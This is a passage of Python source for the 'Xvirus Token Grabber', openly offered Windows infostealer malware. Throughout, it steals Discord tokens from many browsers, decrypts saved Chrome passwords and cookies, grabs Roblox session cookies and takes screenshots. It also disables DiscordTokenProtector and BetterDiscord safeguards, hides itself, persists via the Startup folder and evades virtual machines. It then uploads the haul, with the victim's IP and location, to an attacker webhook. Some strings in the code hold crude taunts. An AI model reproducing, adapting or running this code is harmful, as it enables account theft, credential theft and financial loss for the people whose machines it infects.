            "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"

        self.sep = os.sep
        self.tokens = []
        self.robloxcookies = []

        os.makedirs(self.dir, exist_ok=True)

    def try_extract(func):
        def wrapper(*args, **kwargs):
            try:
                func(*args, **kwargs)
            except Exception:
                pass
        return wrapper

    async def checkToken(self, tkn: str) -> str:
        try:
            r = httpx.get(
                url=self.baseurl,
                headers=self.getHeaders(tkn),
                timeout=5.0
            )
        except (httpx._exceptions.ConnectTimeout, httpx._exceptions.TimeoutException):
            pass
        if r.status_code == 200 and tkn not in self.tokens:
            self.tokens.append(tkn)

    async def init(self):
        await self.bypassBetterDiscord()
        await self.bypassTokenProtector()
        function_list = [self.screenshot, self.grabTokens,
                         self.grabRobloxCookie]
        if self.fetchConf('hide_self'):
            function_list.append(self.hide)

        if self.fetchConf('startup'):
            function_list.append(self.startup)

        if os.path.exists(self.appdata+'\\Google\\Chrome\\User Data\\Default') and os.path.exists(self.appdata+'\\Google\\Chrome\\User Data\\Local State'):
            function_list.append(self.grabPassword)
            function_list.append(self.grabCookies)

        for func in function_list:
            process = threading.Thread(target=func, daemon=True)
            process.start()
        for t in threading.enumerate():
            try:
                t.join()
            except RuntimeError:
                continue
        self.neatifyTokens()
        self.finish()
        shutil.rmtree(self.dir)

    def hide(self):
        ctypes.windll.kernel32.SetFileAttributesW(argv[0], 2)

    def startup(self):
        try:
            shutil.copy2(argv[0], self.startup_loc)
        except Exception:
            pass

    async def bypassTokenProtector(self):
        tp = f"{self.roaming}\\DiscordTokenProtector\\"
        if not os.path.exists(tp):
            return
        config = tp+"config.json"

        for i in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
            try:
                os.remove(tp+i)
            except FileNotFoundError:
                pass
        if os.path.exists(config):
            with open(config, errors="ignore") as f:
                try:
                    item = json.load(f)
                except json.decoder.JSONDecodeError:
                    return
                item['S1LKT0UCH just raped your token-protector shit LMAOOOO https://discord.gg/HfwtKBEFAJ'] = "https://github.com/S1LKT0UCH"
                item['auto_start'] = False
                item['auto_start_discord'] = False
                item['integrity'] = False
                item['integrity_allowbetterdiscord'] = False
                item['integrity_checkexecutable'] = False
                item['integrity_checkhash'] = False
                item['integrity_checkmodule'] = False
                item['integrity_checkscripts'] = False
                item['integrity_checkresource'] = False
                item['integrity_redownloadhashes'] = False
                item['iterations_iv'] = 364
                item['iterations_key'] = 457
                item['version'] = 69420
            with open(config, 'w') as f:
                json.dump(item, f, indent=2, sort_keys=True)
            with open(config, 'a') as f:
                f.write(
                    "\n\n//S1LKT0UCH just raped your token-protector shit LMAOOOO https://discord.gg/HfwtKBEFAJ | https://github.com/S1LKT0UCH")

    async def bypassBetterDiscord(self):
        bd = self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"
        if os.path.exists(bd):
            x = "api/webhooks"
            with open(bd, 'r', encoding="cp437", errors='ignore') as f:
                txt = f.read()
                content = txt.replace(x, 'Rdmo1TheGoat')
            with open(bd, 'w', newline='', encoding="cp437", errors='ignore') as f:
                f.write(content)

    def getProductValues(self):
        try:
            wkey = subprocess.check_output(
                r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", creationflags=0x08000000).decode().rstrip()
        except Exception:
            wkey = "N/A (Likely Pirated)"
        try:
            productName = subprocess.check_output(
                r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName", creationflags=0x08000000).decode().rstrip()
        except Exception:
            productName = "N/A"
        return [productName, wkey]

    @try_extract
    def grabTokens(self):
        paths = {
            'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + r'\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + r'\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming+f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in findall(self.encrypted_regex, line):
                                token = self.decrypt_val(b64decode(
                                    y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+f'\\{disc}\\Local State'))
                                asyncio.run(self.checkToken(token))
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in findall(self.regex, line):
                            asyncio.run(self.checkToken(token))

        if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in findall(self.regex, line):
                            asyncio.run(self.checkToken(token))

    @try_extract
    def grabPassword(self):
        master_key = self.get_master_key(
            self.appdata+'\\Google\\Chrome\\User Data\\Local State')
        login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Login Data'
        login = self.dir+self.sep+"Loginvault1.db"

        shutil.copy2(login_db, login)
        conn = sqlite3.connect(login)
        cursor = conn.cursor()
        with open(self.dir+"\\Google Passwords.txt", "w", encoding="cp437", errors='ignore') as f:
            cursor.execute(
                "SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = self.decrypt_val(
                    encrypted_password, master_key)
                if url != "":
                    f.write(
                        f"Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")
        cursor.close()
        conn.close()
        os.remove(login)

    @try_extract
    def grabCookies(self):
        master_key = self.get_master_key(
            self.appdata+'\\Google\\Chrome\\User Data\\Local State')
        login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Network\\cookies'
        login = self.dir+self.sep+"Loginvault2.db"

        shutil.copy2(login_db, login)
        conn = sqlite3.connect(login)
        cursor = conn.cursor()
        with open(self.dir+"\\Google Cookies.txt", "w", encoding="cp437", errors='ignore') as f:
            cursor.execute(
                "SELECT host_key, name, encrypted_value from cookies")
            for r in cursor.fetchall():
                host = r[0]
                user = r[1]
                decrypted_cookie = self.decrypt_val(r[2], master_key)
                if host != "":
                    f.write(
                        f"Host: {host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
                if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_cookie:
                    self.robloxcookies.append(decrypted_cookie)
        cursor.close()
        conn.close()
        os.remove(login)

    def neatifyTokens(self):
        f = open(self.dir+"\\Discord Info.txt",
                 "w", encoding="cp437", errors='ignore')
        for token in self.tokens:
            j = httpx.get(
                self.baseurl, headers=self.getHeaders(token)).json()
            user = j.get('username') + '#' + str(j.get("discriminator"))

            badges = ""
            flags = j['flags']
            flags = j['flags']
            if (flags == 1):
                badges += "Staff, "
            if (flags == 2):
                badges += "Partner, "
            if (flags == 4):
                badges += "Hypesquad Event, "
            if (flags == 8):
                badges += "Green Bughunter, "
            if (flags == 64):
                badges += "Hypesquad Bravery, "
            if (flags == 128):
                badges += "HypeSquad Brillance, "
            if (flags == 256):
                badges += "HypeSquad Balance, "
            if (flags == 512):
                badges += "Early Supporter, "
            if (flags == 16384):
                badges += "Gold BugHunter, "
            if (flags == 131072):
                badges += "Verified Bot Developer, "
            if (badges == ""):
                badges = "None"
            email = j.get("email")
            phone = j.get("phone") if j.get(
                "phone") else "No Phone Number attached"
            nitro_data = httpx.get(
                self.baseurl+'/billing/subscriptions', headers=self.getHeaders(token)).json()
            has_nitro = False
            has_nitro = bool(len(nitro_data) > 0)
            billing = bool(len(json.loads(httpx.get(
                self.baseurl+"/billing/payment-sources", headers=self.getHeaders(token)).text)) > 0)
            f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n")
        f.close()

    def grabRobloxCookie(self):
        def subproc(path):
            try:
                return subprocess.check_output(
                    fr"powershell Get-ItemPropertyValue -Path {path}:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com -Name .ROBLOSECURITY",
                    creationflags=0x08000000).decode().rstrip()
            except Exception:
                return None
        reg_cookie = subproc(r'HKLM')
        if not reg_cookie:
            reg_cookie = subproc(r'HKCU')
        if reg_cookie:
            self.robloxcookies.append(reg_cookie)
        if self.robloxcookies:
            with open(self.dir+"\\Roblox Cookies.txt", "w") as f:
                for i in self.robloxcookies:
                    f.write(i+'\n')

    def screenshot(self):
        image = ImageGrab.grab(
            bbox=None,
            include_layered_windows=False,
            all_screens=True,
            xdisplay=None
        )
        image.save(self.dir + "\\Screenshot.png")
        image.close()

    def finish(self):
        for i in os.listdir(self.dir):
            if i.endswith('.txt'):
                path = self.dir+self.sep+i
                with open(path, "r", errors="ignore") as ff:
                    x = ff.read()
                    if not x:
                        ff.close()
                        os.remove(path)
                    else:
                        with open(path, "w", encoding="utf-8", errors="ignore") as f:
                            f.write(
                                "Xvirus grabber・By Xvirus・https://xvirus.xyz/ | https://github.com/Xvirus0/Xvirus-Tool\n\n")
                        with open(path, "a", encoding="utf-8", errors="ignore") as fp:
                            fp.write(
                                x+"\n\nXvirus grabber・By Xvirus・https://xvirus.xyz/ | https://github.com/Xvirus0/Xvirus-Tool")
        w = self.getProductValues()
        wname = w[0].replace(" ", "᠎ ")
        wkey = w[1].replace(" ", "᠎ ")
        ram = str(psutil.virtual_memory()[0]/1024 ** 3).split(".")[0]
        disk = str(psutil.disk_usage('/')[0]/1024 ** 3).split(".")[0]
        # IP, country, city, region, google maps location
        data = httpx.get("https://ipinfo.io/json").json()
        ip = data.get('ip')
        city = data.get('city')
        country = data.get('country')
        region = data.get('region')
        org = data.get('org')
        googlemap = "https://www.google.com/maps/search/google+map++" + \
            data.get('loc')

        _zipfile = os.path.join(
            self.appdata, f'Vault-[{Victim}].zip')
        zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
        abs_src = os.path.abspath(self.dir)
        for dirname, _, files in os.walk(self.dir):
            for filename in files:
                absname = os.path.abspath(os.path.join(dirname, filename))
                arcname = absname[len(abs_src) + 1:]
                zipped_file.write(absname, arcname)
        zipped_file.close()
        files_found = ''
        for f in os.listdir(self.dir):
            files_found += f"・{f}\n"
        tokens = ''
        for tkn in self.tokens:
            tokens += f'{tkn}\n\n'
        fileCount = f"{len(files)} Files Found: "
        embed = {
            'username': 'Xvirus Token Grabber',
            'avatar_url': 'https://xvirus.xyz/xicon.png',
            'embeds': [
                {
                    'author': {
                        'name': f'{Victim} Just ran Xvirus Token Grabber',
                        'url': 'https://xvirus.xyz/',
                        'icon_url': 'https://xvirus.xyz/xicon.png'
                    },
                    'color': 0xC50F1F,
                    'description': f'[Google Maps Location]({googlemap})',
                    'fields': [
                        {
                            'name': '\u200b',
                            'value': f'''```fix
                                IP:᠎ {ip.replace(" ", "᠎ ") if ip else "N/A"}
                                Org:᠎ {org.replace(" ", "᠎ ") if org else "N/A"}
                                City:᠎ {city.replace(" ", "᠎ ") if city else "N/A"}
                                Region:᠎ {region.replace(" ", "᠎ ") if region else "N/A"}
                                Country:᠎ {country.replace(" ", "᠎ ") if country else "N/A"}```
                            '''.replace(' ', ''),
                            'inline': True
                        },
                        {
                            'name': '\u200b',
                            'value': f'''```fix
                                PCName: {Victim_pc.replace(" ", "᠎ ")}
                                WinKey:᠎ {wkey}
                                Platform:᠎ {wname}
                                DiskSpace:᠎ {disk}GB
                                Ram:᠎ {ram}GB```
                            '''.replace(' ', ''),
                            'inline': True
                        },
                        {
                            'name': '**Tokens:**',
                            'value': f'''```yaml
                                {tokens if tokens else "No tokens extracted"}```
                            '''.replace(' ', ''),
                            'inline': False
                        },
                        {
                            'name': fileCount,
                            'value': f'''```ini
                                
                                {files_found.strip()}
                                ```
                            '''.replace(' ', ''),
                            'inline': False
                        }
                    ],
                    'color' : 0xC50F1F,
                    'footer': {
                        'text': 'Xvirus grabber・By Xvirus・https://xvirus.xyz/ | https://github.com/Xvirus0/Xvirus-Tool'
                    }
                }
            ]
        }
        httpx.post(self.webhook, json=embed)
        with open(_zipfile, 'rb') as f:
            httpx.post(self.webhook, files={'upload_file': f})
        os.remove(_zipfile)


class AntiDebug(functions):
    inVM = False

    def __init__(self):
        self.processes = list()

        for func in [self.registryCheck, self.specsCheck]:
            process = threading.Thread(target=func, daemon=True)
            self.processes.append(process)
            process.start()
        for t in self.processes:
            try:
                t.join()
            except RuntimeError:
                continue

    def programExit(self):
        self.__class__.inVM = True

    def programKill(self, proc):
        try:
            os.system(f"taskkill /F /T /IM {proc}")
        except (PermissionError, InterruptedError, ChildProcessError, ProcessLookupError):
            pass

    def specsCheck(self):
        ram = str(psutil.virtual_memory()[0]/1024 ** 3).split(".")[0]
        if int(ram) <= 3:  # 3gb or less ram
            self.programExit()
        disk = str(psutil.disk_usage('/')[0]/1024 ** 3).split(".")[0]
        if int(disk) <= 50:  # 50gb or less disc space
            self.programExit()
        if int(psutil.cpu_count()) <= 1:  # 1 or less cpu cores
            self.programExit()

    def registryCheck(self):
        reg1 = os.system(
            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
        reg2 = os.system(
            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")
        if (reg1 and reg2) != 1:
            self.programExit()

        handle = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                'SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum')
        try:
            reg_val = winreg.QueryValueEx(handle, '0')[0]

            if ("VMware" or "VBOX") in reg_val:
                self.programExit()
        finally:
            winreg.CloseKey(handle)
            

if __name__ == "__main__" and os.name == "nt":
    asyncio.run(Xvirus_Token_Grabber().init())


